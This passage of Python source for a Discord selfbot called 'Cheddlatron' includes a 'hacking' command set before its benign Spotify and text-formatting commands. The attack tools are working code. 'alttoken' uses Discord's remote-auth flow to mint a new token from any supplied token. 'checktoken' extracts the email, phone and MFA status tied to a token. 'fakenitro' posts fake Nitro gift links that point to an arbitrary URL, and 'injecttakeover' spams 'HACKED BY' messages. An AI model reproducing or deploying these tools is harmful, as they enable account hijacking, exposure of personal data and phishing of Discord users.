async def injecttakeover(ctx, user: discord.User = None):
    headers = {'Authorization': config_get('token')}
    nitro = requesters.get("https://discord.com/api/v9/users/@me", headers=headers)
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f"""{user_mention} [91mR[93mA[92mI[96n[94mB[95mO[97mW[0m
]0;HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON | HACKED BY CHEDDLATRON
c"""
    if nitro.json()["premium_type"] == 2:
        ascii1 = f"""{user_mention} 
[93m [93m [93m [91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m
[93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m
[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[93m
[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[93m
[93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[93m.[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m
[93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m
[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [91m+[91m+[91m+[93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m [93m

[43;31;1;4m#CheddlatronOnTop[0m"""
    else:
        ascii1 = f"{user_mention} [43;31;1;4m#CheddlatronOnTop[0m"
    await ctx.send(f'{code}', delete_after=0)
    await ctx.send(f'{ascii1}', delete_after=0)

@Cheddlatron.command(description=f"Generates a new token for the given token. \nUsage: {config_get('prefix')}alttoken <token>", help="hacking")
async def alttoken(ctx, account_token):
    keypair = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
    async def serialize_key(key):
        t = key.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return base64.b64encode(t).decode('latin1')

    async def rsa_decrypt(key, decoded_nonce):
        return key.decrypt(
            decoded_nonce,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    def decode_nonce(e):
        return base64.b64decode(e.encode('latin1'))

    def encode_decrypted_packet(e):
        return base64.b64encode(bytes(e)).decode('latin1').replace('/', '_').replace('+', '-').rstrip('=')

    async def get_handshake_token(token, fingerprint):
        response = requesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth',
            json_data={'fingerprint': fingerprint},
            headers={'Authorization': token}
        )
        return response.json()['handshake_token']

    async def finish_handshake(token, handshake_token):
        return requesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth/finish',
            json_data={'handshake_token': handshake_token, 'temporary_token': False},
            headers={'Authorization': token}
        )

    async def get_encrypted_token_from_ticket(ticket_var):
        response = requesters.post(
            'https://discord.com/api/v9/users/@me/remote-auth/login',
            json_data={'ticket': ticket_var}
        )
        return response.json()['encrypted_token']

    async def handle_message(data, ws):
        j = json.loads(data)
        
        if j["op"] == "hello":
            serialized = await serialize_key(keypair)
            keypacket = {
                "op": "init",
                "encoded_public_key": serialized,
            }
            await ws.send(json.dumps(keypacket))
        
        if j["op"] == "nonce_proof":
            decoded = decode_nonce(j["encrypted_nonce"])
            decrypted = await rsa_decrypt(keypair, decoded)
            final_nonce = encode_decrypted_packet(decrypted)
            nonce_packet = {
                "op": "nonce_proof",
                "nonce": final_nonce,
            }
            await ws.send(json.dumps(nonce_packet))
        
        if j["op"] == "pending_remote_init":
            fingerprint = j["fingerprint"]
            handshake_token = await get_handshake_token(account_token, fingerprint)
            await finish_handshake(account_token, handshake_token)
        
        if j["op"] == "pending_login":
            ticket = j["ticket"]
            encrypted_token = await get_encrypted_token_from_ticket(ticket)
            decoded = decode_nonce(encrypted_token)
            decrypted = await rsa_decrypt(keypair, decoded)
            new_token = decrypted.decode('utf-8')
            heading = "Alt-Token"
            body = new_token
            cmdname = "alttoken"
            await panelmaker(ctx, heading, body, cmdname)
            await ws.close()

    async def main():
        try:
            async with websockets.connect('wss://remote-auth-gateway.discord.gg/?v=2', extra_headers={'Origin': 'https://discord.com'}) as ws:
                while True:
                    data = await ws.recv()
                    await handle_message(data, ws)
        except websockets.exceptions.ConnectionClosed as e:
            pass
        except Exception as e:
            pass
    await main()

@Cheddlatron.command(description=f"Changes the main token to another specified token within Tokens.json config. \nUsage: {config_get('prefix')}changetoken <token number (e.g 1 2 3)>", help="utility")
async def changetoken(ctx, token_number: int):
    token_key = f"Token{token_number}"

    with open('Data//Settings//Configs//tokens.json', 'r') as file:
        tokens = json.load(file)

    with open('config.json', 'r') as file:
        config = json.load(file)
        current_token = config.get('token', None)

    if token_key not in tokens:
        await ctx.send(f"Token key '{token_key}' not found.")
        return

    new_token, tokens[token_key] = tokens[token_key], current_token

    with open('Data//Settings//Configs//tokens.json', 'w') as file:
        json.dump(tokens, file, indent=4)

    config['token'] = new_token
    with open('config.json', 'w') as file:
        json.dump(config, file, indent=4)
    try:
        heading = f"Token Swapped!"
        body = f"Token '{token_key}' has been swapped and Cheddlatron is now attempting to restart."
        cmdname = "changetoken"
        await panelmaker(ctx, heading, body, cmdname)
        os.startfile("Cheddlatron.exe")
    except FileNotFoundError:
        os.system("python Cheddlatron.py")
        os._exit(1)
    except Exception as e:
        await ctx.send(f"Failed to restart Cheddlatron.exe: {e}")

@Cheddlatron.command(description=f"Sends half a user's Discord token. \nUsage: {config_get('prefix')}halftoken [@user]", help="hacking")
async def halftoken(ctx, member: discord.User = None):    
    if member == None:
        member = ctx.message.author
    encoded = base64.b64encode('{}'.format(member.id).encode('ascii'))
    heading = f"Half of {member.name}'s Discord Token"
    body = encoded.decode()
    cmdname = "halftoken"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Generates and sends a random nitro code. \nUsage: {config_get('prefix')}fakenitro [redirect link]", help="hacking")
async def fakenitro(ctx, link = "https://discord.gg/cheddlatron"):    
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    await ctx.send(f"[discord.gift/{code}]({link})")

@Cheddlatron.command(description=f"Grabs info about a specified token. \nUsage: {config_get('prefix')}checktoken <token>", help="hacking") 
async def checktoken(ctx, token):    
    try:
        headers = {
        'Authorization': token,
        'Content-type': 'application/json'}
        r = requesters.get("https://discord.com/api/v9/users/@me" , headers=headers)
        global r1
        if r.status_code == 401:
            heading = "Token Check"
            body = f"Token is invalid."
            cmdname = "Check Token"
            await panelmaker(ctx, heading, body, cmdname)
            return
        elif r.status_code == 200:
            data = r.json()
            id = data["id"]
            username = data["username"]
            email = data["email"]
            phone = data["phone"]
            mfa = data['mfa_enabled']
            language = data['locale']
            flags = data['public_flags']
            r1 = requesters.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers = headers)
            if r1.status_code == 403:
                locked = True
            elif r1.status_code != 403:
                locked = False
        heading = "Token Check"
        body = f"ID: {id}\nUsername: {username}\nEmail: {email}\nPhone Number: {phone}\nMFA: {mfa}\nLanguage: {language}\nFlags: {flags}\nLocked: {locked}"
        cmdname = "Check Token"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Token Check"
        body = "Token Invalid"
        cmdname = "checktoken"
        await panelmaker(ctx, heading, body, cmdname)
        
@Cheddlatron.command(description=f"Deletes any webhook. \nUsage: {config_get('prefix')}delwebhook <webhook url>", help="hacking")
async def delwebhook(ctx, url):    
    try:
        requesters.delete(url)
        heading = "Delete Webhook"
        body = "Webhook successfully deleted!"
        cmdname = "delwebhook"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}")
        heading = "Delete Webhook"
        body = f"Something went wrong, please check console Error: {str(e)}"
        cmdname = "delwebhook"
        await panelmaker(ctx, heading, body, cmdname)
        await send_webhook("Delete Webhook Error", f"Failed to delete the webhook due to: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Gives info on an IP. \nUsage: {config_get('prefix')}ipinfo <IP>", help="hacking")
async def ipinfo(ctx, ip):    
    r = requesters.get(f'https://ipinfo.io/{ip}/json')
    r = r.json()
    city = r['city']
    region = r['region']
    org = r['org']
    postal = r['postal']
    timezone = r['timezone']
    heading = f"Info on IP {ip}"
    body = f"City: {city}\nRegion: {region}\nOrg: {org}\nPostal Code: {postal}\nTime Zone: {timezone}"
    cmdname = "ipinfo"
    await panelmaker(ctx, heading, body, cmdname)
#HACKING COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#SPOTIFY COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Plays a song in spotify. \nUsage: {config_get('prefix')}play <song>", help="spotify")
async def play(ctx, *, song):
    await spotify_access()
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    headers = {"Authorization": spotifytoken, 'content-type': 'application/json'}
    songurl = (urlify(f"https://api.spotify.com/v1/search?q={song}&type=track&limit=1"))    
    a = json.loads(requesters.get(songurl, headers=headers).text)
    link = a['tracks']['items'][0]['uri']
    payload={"uris":[link],"position_ms":0}
    payloadlen = len(str(payload))
    requesters.put(f"https://api.spotify.com/v1/me/player/play?device_id={spot_device}", headers={'authorization': spotifytoken, 'content-type': 'application/json', 'content-length': str(payloadlen)}, json_data=payload)

@Cheddlatron.command(description=f"Pauses your spotify. \nUsage: {config_get('prefix')}pause", help="spotify")
async def pause(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/pause?device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Resumes your spotify. \nUsage: {config_get('prefix')}resume", help="spotify")
async def resume(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/play?device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Skips to the next song in spotify. \nUsage: {config_get('prefix')}skip", help="spotify")
async def skip(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.post(f"https://api.spotify.com/v1/me/player/next?device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Plays the previous song in spotify. \nUsage: {config_get('prefix')}previous", help="spotify")
async def previous(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.post(f"https://api.spotify.com/v1/me/player/previous?device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Shuffles a playlist in spotify. \nUsage: {config_get('prefix')}shuffle", help="spotify")
async def shuffle(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/shuffle?state=true&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Unshuffles a playlist in spotify. \nUsage: {config_get('prefix')}unshuffle", help="spotify")
async def unshuffle(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/shuffle?state=false&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Adjusts the volume in spotify. \nUsage: {config_get('prefix')}volume <volume (1-100)>", help="spotify")
async def volume(ctx, volume):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/volume?volume_percent={volume}&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Loops the current song in spotify. \nUsage: {config_get('prefix')}loop", help="spotify")
async def loop(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=context&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Repeats the current song in spotify once. \nUsage: {config_get('prefix')}looponce", help="spotify")
async def looponce(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=track&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Stops looping the current song in spotify. \nUsage: {config_get('prefix')}stoploop", help="spotify")
async def stoploop(ctx):    
    spotifytoken = await spotify_access()
    spot_device = json.loads(requesters.get('https://api.spotify.com/v1/me/player/', headers={'authorization': spotifytoken}).text)['device']['id']
    requesters.put(f"https://api.spotify.com/v1/me/player/repeat?state=off&device_id={spot_device}", headers={'authorization': spotifytoken})

@Cheddlatron.command(description=f"Sends a listen along link so the people can listen along with your spotify. \nUsage: {config_get('prefix')}listenalong", help="spotify")
async def listenalong(ctx):
    myload = {"content":"","nonce":"","tts":False,"activity":{"type":3,"session_id":seshid,"party_id":f"spotify:{Cheddlatron.user.id}"}}
    headpls = {'authorization': config_get('token'), 'Content-Type': 'application/json'}
    r = requested.post(f'https://ptb.discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headpls, data=json.dumps(myload))

@Cheddlatron.command(description = f"Displays what song is currently playing on your spotify. \nUsage: {config_get('prefix')}nowplaying", help = "spotify")
async def nowplaying(ctx):
    spotifytoken  = await spotify_access()
    r = json.loads(requesters.get(f'https://api.spotify.com/v1/me/player', headers={'authorization': spotifytoken}).text)
    artistnames = []
    artistlist = r['item']['artists']
    for thing in artistlist:
        artistnames.append(thing['name'])
    artists = ', '.join(artistnames)
    heading = f"Now Playing: {r['item']['name']}"
    body = f"ID: {r['item']['id']}\nDuration: {str(timedelta(seconds = int(str(int(r['item']['duration_ms']) / 1000).split('.')[0]))).strip('00:')}\nAlbum: {r['item']['album']['name']}\nAlbum Type: {r['item']['album']['type']}\nArtist/s: {artists}\nAlbum Released: {r['item']['album']['release_date']}\nSong Popularity: {r['item']['popularity']}\nTrack Number: {r['item']['track_number']}\nMarket Count: {len(r['item']['available_markets'])}"
    cmdname = "nowplaying"
    await panelmaker(ctx, heading, body, cmdname)
#SPOTIFY COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#FUN COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Shows a users reviews on Review DB. \nUsage: {config_get('prefix')}reviews [@user]", help="utility")
async def reviews(ctx, user: discord.User=None):
    body = ""
    if not user:
        user = Cheddlatron.user
    revreq = requesters.get(f'https://manti.vendicated.dev/api/reviewdb/users/{user.id}/reviews?flags=0&offset=0').json()
    username = requesters.get(f'https://canary.discord.com/api/v9/users/{user.id}/profile', headers={'authorization':config_get('token')}).json()['user']['global_name']
    heading = f"User Reviews for {username} ({revreq['reviewCount']} total)"
    for review in revreq['reviews']:
        if review['id'] != 0:
            body += f"Review from {review['sender']['username']}\n{review['comment']}\n\n"
    cmdname = "reviews"
    if revreq['reviewCount'] == 0:
        heading = "Reviews"
        body = f'{user.name} is lonely he got no reviews damn'
        cmdname = "reviews"
        await panelmaker(ctx, heading, body, cmdname)
        return
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Writes a review on a users profile. \nUsage: {config_get('prefix')}review <@user> <review>", help="utility")
async def review(ctx, user: discord.User, *, review):
    try:
        payload = {
            "authorize": True,
            "integration_type": 0,
            "permissions": "0"
        }
        resp = requesters.post(f"https://discord.com/api/v9/oauth2/authorize?client_id=915703782174752809&response_type=code&redirect_uri=https%3A%2F%2Fmanti.vendicated.dev%2Fapi%2Freviewdb%2Fauth&scope=identify", headers={"Authorization": config_get('token')}, json_data=payload).json()
        link = resp['location']
        resp = requesters.get(link+"&clientMod=vencord").json()
        dbtoken = resp['token']
        uid = str(user.id)
        payload = {
            "comment": review,
            "userid": uid
        }
        requesters.put(f"https://manti.vendicated.dev/api/reviewdb/users/{uid}/reviews", json_data=payload, headers={"Authorization": dbtoken})
        heading = "Review Successful!"
        body = f"Successfully reviewed {user.name}"
        cmdname = "review"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Error"
        body = "An unknown erorr occured."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Deletes a review you have on a user. \nUsage: {config_get('prefix')}delreview <@user>", help="utility")
async def delreview(ctx, user: discord.User):
        payload = {
            "authorize": True,
            "integration_type": 0,
            "permissions": "0"
        }
        resp = requesters.post(f"https://discord.com/api/v9/oauth2/authorize?client_id=915703782174752809&response_type=code&redirect_uri=https%3A%2F%2Fmanti.vendicated.dev%2Fapi%2Freviewdb%2Fauth&scope=identify", headers={"Authorization": config_get('token')}, json_data=payload).json()
        link = resp['location']
        resp = requesters.get(link+"&clientMod=vencord").json()
        dbtoken = resp['token']
        revreq = requesters.get(f'https://manti.vendicated.dev/api/reviewdb/users/{user.id}/reviews?flags=0&offset=0').json()
        for review in revreq['reviews']:
            if review['id'] != 0:
                if review['sender']['discordID'] == str(Cheddlatron.user.id):
                        payload = {"reviewid": review['id']}
                        resp = requesters.delete(f"https://manti.vendicated.dev/api/reviewdb/users/{review['id']}/reviews", headers={'Authorization': dbtoken}, json_data=payload).json()
                        if resp["success"] == True:
                            heading = "Review Deleted!"
                            body = f"Successfully deleted review from {user.name}"
                            cmdname="delreview"
                            await panelmaker(ctx, heading, body, cmdname)
                            return
                        else:
                            heading="Error"
                            body="An issue occured whilst trying to delete review."
                            cmdname = "ERROR"
                            await panelmaker(ctx, heading, body, cmdname)
                            return
        heading = "Could Not Find Review"
        body = f"Could not find a review from you on user '{user.name}'"
        cmdname = "delreview"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Shows who discord believes your favourite friends to be based on their affinity algorithm. \nUsage: {config_get('prefix')}favouritefriends", help="fun")
async def favouritefriends(ctx):
    r = json.loads(requesters.get('https://discord.com/api/v9/users/@me/affinities/users', headers={'authorization': config_get('token'), 'x-super-properties': getxsuper()}).text)['user_affinities']
    if r == []:
        heading = "Error"
        body = "You have no user affinities."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    top10 = []
    for i in range(0,10):
        req = requesters.get(f"https://discord.com/api/v9/users/{r[i]['user_id']}/profile", headers={'authorization': config_get('token'), 'x-super-properties': getxsuper()}).json()
        name = req['user']['global_name']
        top10.append(name)
    heading = f"{Cheddlatron.user.name}'s Favourite Friends"
    body = '\n'.join(top10)
    cmdname = "favouritefriends"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Shows what guilds discord believes to be your favourite based on their affinity algorithm. \nUsage: {config_get('prefix')}favouriteguilds", help="fun")
async def favouriteguilds(ctx):
    r = json.loads(requesters.get('https://discord.com/api/v9/users/@me/affinities/guilds', headers={'authorization': config_get('token')}).text)
    if r['guild_affinities'] == []:
        heading = "Error"
        body = "You have no guild affinities."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return   
    userguilds = json.loads(requesters.get('https://discord.com/api/v9/users/@me/guilds', headers={'authorization': config_get('token')}).text)
    myguilds = {}
    for guild in userguilds:
        myguilds[str(guild['id'])] = guild['name']
    top10 = []
    for i in range(0,10):
        guild = r['guild_affinities'][i]['guild_id']
        top10.append(f"{i+1}. {myguilds[guild]}")
    heading = f"{Cheddlatron.user.name}'s Favourite Guilds"
    body = '\n'.join(top10)
    cmdname = "favouriteguilds"
    await panelmaker(ctx, heading, body, cmdname)


@Cheddlatron.command(description=f"Sends text in a vaporwave font. \nUsage: {config_get('prefix')}vaporwave <text>", help="fun")
async def vaporwave(ctx, *, text):     
    special_font_chars = {
        'a': 'ａ', 'b': 'ｂ', 'c': 'ｃ', 'd': 'ｄ', 'e': 'ｅ',
        'f': 'ｆ', 'g': 'ｇ', 'h': 'ｈ', 'i': 'ｉ', 'j': 'ｊ',
        'k': 'ｋ', 'l': 'ｌ', 'm': 'ｍ', 'n': 'ｎ', 'o': 'ｏ',
        'p': 'ｐ', 'q': 'ｑ', 'r': 'ｒ', 's': 'ｓ', 't': 'ｔ',
        'u': 'ｕ', 'v': 'ｖ', 'w': 'ｗ', 'x': 'ｘ', 'y': 'ｙ', 'z': 'ｚ',
        'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ',
        'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
        'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ',
        'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
        'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ',
        '!': '！', '£': '£', '$': '＄', '%': '％', '^': '＾',
        '&': '＆', '*': '＊', '(': '（', ')': '）', '~': '～',
        '@': '＠', "'": '＇', '#': '＃', '/': '／', '?': '？',
        '.': '．', '>': '＞', '<': '＜', ',': '，', '|': '｜',
        '-': '－', '_': '＿', '=': '＝', '+': '＋',
        '1': '１', '2': '２', '3': '３', '4': '４', '5': '５',
        '6': '６', '7': '７', '8': '８', '9': '９', '0': '０',
        '\\': '＼'
    }
    translated_text = ''.join([special_font_chars.get(char, char) for char in text])
    await ctx.send(translated_text)

@Cheddlatron.command(description=f"Spoilers every character in a sentence. \nUsage: {config_get('prefix')}spoiler <text>", help="fun")
async def spoiler(ctx, *, text):     
    spoiler_text = '||'+'||||' .join(text) + '||' 
    await ctx.send(spoiler_text)

@Cheddlatron.command(name="1337", description=f"Formats text into leet speak. \nUsage: {config_get('prefix')}leet <text>", help="fun") 
async def leet(ctx, *, text):    
    leet_dict = {
    'a': '4', 'e': '3', 'l': '1', 't': '7', 'o': '0', 's': '5', 'w': '\\/\\/', 'h': '|-|',
    'A': '4', 'E': '3', 'L': '1', 'T': '7', 'O': '0', 'S': '5', 'W': '\\/\\/', 'H': '|-|'
}
    leet_text = ''.join([leet_dict.get(char, char) for char in text])
    
    await ctx.send(leet_text)

@Cheddlatron.command(description=f"Owoifys text. \nUsage: {config_get('prefix')}owoify <text>", help="fun")
async def owoify(ctx, *, text):     
    def owoify_text(text):
        text = text.replace('r', 'w')
        text = text.replace('l', 'w')
        text = text.replace('R', 'W')
        text = text.replace('L', 'W')
        text = text.replace('th', 'f')
        text = text.replace('Th', 'F')
        text = text.replace('ove', 'uv')
        text = text.replace('you', 'wu')
        text = text.replace('You', 'Wu')
        text = text.replace('u', 'uwu')
        text = text.replace('U', 'UwU')
        return text
    owo_text = owoify_text(text)
    await ctx.send(owo_text)

@Cheddlatron.command(description=f"Italicises text. \nUsage: {config_get('prefix')}italic <text>", help="fun") 
async def italic(ctx, *, text):    
    await ctx.send(f"*{text}*")

@Cheddlatron.command(description=f"Emblodens text. \nUsage: {config_get('prefix')}bold <text>", help="fun") 
async def bold(ctx, *, text):   
    await ctx.send(f"**{text}**")

@Cheddlatron.command(description=f"Makes text very large. \nUsage: {config_get('prefix')}superbold <text>", help="fun") 
async def superbold(ctx, *, text):   
    await ctx.send(f"# {text}")

@Cheddlatron.command(description=f"Quotes text. \nUsage: {config_get('prefix')}quote <text>", help="fun") 
async def quote(ctx, *, text):    
    await ctx.send(f">>> {text}")

@Cheddlatron.command(description=f"Italicises and emboldens text. \nUsage: {config_get('prefix')}italicbold <text>", help="fun") 
async def italicbold(ctx, *, text):    
    await ctx.send(f"***{text}***")

@Cheddlatron.command(description=f"Underlines text. \nUsage: {config_get('prefix')}underline <text>", help="fun") 
async def underline(ctx, *, text):    
    await ctx.send(f"__{text}__")

@Cheddlatron.command(description=f"Creates a hyperlink. \nUsage: {config_get('prefix')}hyperlink <link> <text>", help="fun") 
async def hyperlink(ctx, link, *, text):    
    await ctx.send(f"[{text}]({link})")

@Cheddlatron.command(description=f"Translates text to morse code. \nUsage: {config_get('prefix')}morse <text>", help="fun") 
async def morse(ctx, *, text):    
    morse_dict = {
    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
    'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
    'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..',
    '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
    '6': '-....', '7': '--...', '8': '---..', '9': '----.', '0': '-----',
    ' ': ' '}
    morse_text = ' '.join([morse_dict.get(char.upper(), char) for char in text])  
    await ctx.send(morse_text)

@Cheddlatron.command(description=f"Translates morse code to text. \nUsage: {config_get('prefix')}demorse <morse>", help="fun") 
async def demorse(ctx, *, morse_text):    
    morse_dict = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
        'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
        'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
        'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
        'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..',
        '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
        '6': '-....', '7': '--...', '8': '---..', '9': '----.', '0': '-----',
        ' ': ' '
    }
    reverse_morse_dict = {value: key for key, value in morse_dict.items()}
    text = ''.join([reverse_morse_dict.get(char, char) for char in morse_text.split()])   
    await ctx.send(text)

@Cheddlatron.command(description=f"Translates text to hexidecimal. \nUsage: {config_get('prefix')}hex <text>", help="fun") 
async def hex(ctx, *, text):    
    hex_text = text.encode('utf-8').hex()
    await ctx.send(f'0x{hex_text}')

@Cheddlatron.command(description=f"Translates hexidecimal to text. \nUsage: {config_get('prefix')}dehex <hex>", help="fun") 
async def dehex(ctx, *, hex_text):    
    try:
